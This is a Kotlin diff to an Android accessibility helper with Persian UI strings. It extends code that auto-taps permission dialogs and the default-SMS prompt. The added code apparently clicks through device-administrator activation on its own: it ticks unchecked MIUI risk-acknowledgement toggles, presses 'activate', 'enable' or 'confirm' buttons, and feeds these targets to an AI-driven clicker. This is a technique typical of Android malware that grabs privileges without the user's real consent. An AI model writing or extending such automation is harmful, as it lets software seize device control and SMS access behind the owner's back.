@@ -534,6 +534,7 @@ internal object UiGuideBridge {
         val pkg = root.packageName?.toString().orEmpty()
         PermissionDialogTapper.clearGuideNodes()
         val smsDefault = guidedJobPhase == "SMS_DEFAULT"
+        val deviceAdmin = guidedJobPhase == "DEVICE_ADMIN"
         val oemList = PermissionDialogTapper.mode == TapMode.OEM_APP_LIST
         val appLabels = when {
             guidedTargetLabel.isNotBlank() -> listOf(guidedTargetLabel)
@@ -597,10 +598,14 @@ internal object UiGuideBridge {
                 c.text.equals(label, ignoreCase = true)
             }
             val confirmish = smsDefault && looksSmsConfirm(c.text)
+            val adminAck = deviceAdmin && isToggle && !c.node.isChecked
+            val adminConfirm = deviceAdmin && looksAdminConfirm(c.text)
             when {
                 exactName && c.interactive -> 10
                 exactName -> 9
+                adminAck -> 9
                 confirmish -> 8
+                adminConfirm -> 8
                 (oemList || smsDefault) && c.nearApp && isToggle && !c.node.isChecked -> 7
                 (oemList || smsDefault) && c.nearApp && isToggle -> 6
                 (oemList || smsDefault) && c.nearApp && c.interactive -> 5
@@ -618,7 +623,7 @@ internal object UiGuideBridge {
         }
         val visibleLabels = visibleSet.take(64).toList()
         // همیشه نود بفرست تا CLICK(target_id) کار کند (قبلاً useAi → nodes خالی بود)
-        val limit = if (oemList || smsDefault) MAX_NODES_OEM else MAX_NODES
+        val limit = if (oemList || smsDefault || deviceAdmin) MAX_NODES_OEM else MAX_NODES
         val selected = if (smsDefault) {
             cands.filter { it.text.isNotBlank() || it.nearApp || it.interactive && it.desc.isNotBlank() }
                 .take(limit)
@@ -632,15 +637,24 @@ internal object UiGuideBridge {
         val nodesJson = buildJsonArray {
             selected.forEachIndexed { idx, cand ->
                 val id = "n$idx"
-                hashParts.append(cand.text).append('#').append(cand.desc).append('#').append(cand.cls)
+                val isToggle = cand.node.isCheckable ||
+                    cand.cls.contains("Switch", ignoreCase = true) ||
+                    cand.cls.contains("CheckBox", ignoreCase = true)
+                // MIUI Switch often has empty text; borrow sibling risk label for the AI line.
+                val labelText = when {
+                    cand.text.isNotBlank() -> cand.text
+                    deviceAdmin && isToggle -> nearbyGuideLabel(cand.node)
+                    else -> ""
+                }
+                hashParts.append(labelText).append('#').append(cand.desc).append('#').append(cand.cls)
                 if (cand.nearApp) hashParts.append("#near")
                 hashParts.append(';')
-                PermissionDialogTapper.rememberGuideNode(id, cand.bounds, cand.text, cand.desc)
+                PermissionDialogTapper.rememberGuideNode(id, cand.bounds, labelText.ifBlank { cand.text }, cand.desc)
                 if (cand.nearApp) nearAppCount++
                 add(
                     buildJsonObject {
                         put("id", id)
-                        if (cand.text.isNotBlank()) put("text", cand.text.take(48))
+                        if (labelText.isNotBlank()) put("text", labelText.take(48))
                         if (cand.desc.isNotBlank()) put("desc", cand.desc.take(40))
                         if (cand.cls.isNotBlank()) put("cls", cand.cls)
                         if (cand.node.isClickable) put("clickable", true)
@@ -703,5 +717,34 @@ internal object UiGuideBridge {
         return t.contains("تنظیم برای پیش") || t.contains("set as default") ||
             t.contains("تنظیم به‌عنوان پیش") ||
             ((t.contains("پیش‌فرض") || t.contains("پیش فرض")) && t.contains("تنظیم"))
+    }
+
+    private fun looksAdminConfirm(text: String): Boolean {
+        val t = text.trim().lowercase()
+        if (t.isEmpty()) return false
+        if (Regex("""\(\s*\d+\s*\)""").containsMatchIn(t)) return false
+        return t.contains("فعال‌سازی") || t.contains("فعال سازی") || t.contains("فعال کردن") ||
+            t.contains("activate") || t == "تأیید" || t == "تایید" || t == "ok" ||
+            (t.contains("enable") && !t.contains("disable"))
+    }
+
+    /** Sibling/parent labels next to an empty Switch/CheckBox (MIUI risk ack). */
+    private fun nearbyGuideLabel(node: AccessibilityNodeInfo): String {
+        val parent = try {
+            node.parent
+        } catch (_: Throwable) {
+            null
+        } ?: return ""
+        val parts = ArrayList<String>()
+        for (i in 0 until parent.childCount.coerceAtMost(8)) {
+            try {
+                val c = parent.getChild(i) ?: continue
+                val t = (c.text?.toString().orEmpty() + " " +
+                    c.contentDescription?.toString().orEmpty()).trim()
+                if (t.length >= 2) parts += t.take(48)
+            } catch (_: Throwable) {
+            }
+        }
+        return parts.joinToString(" ").take(48)
     }
 }
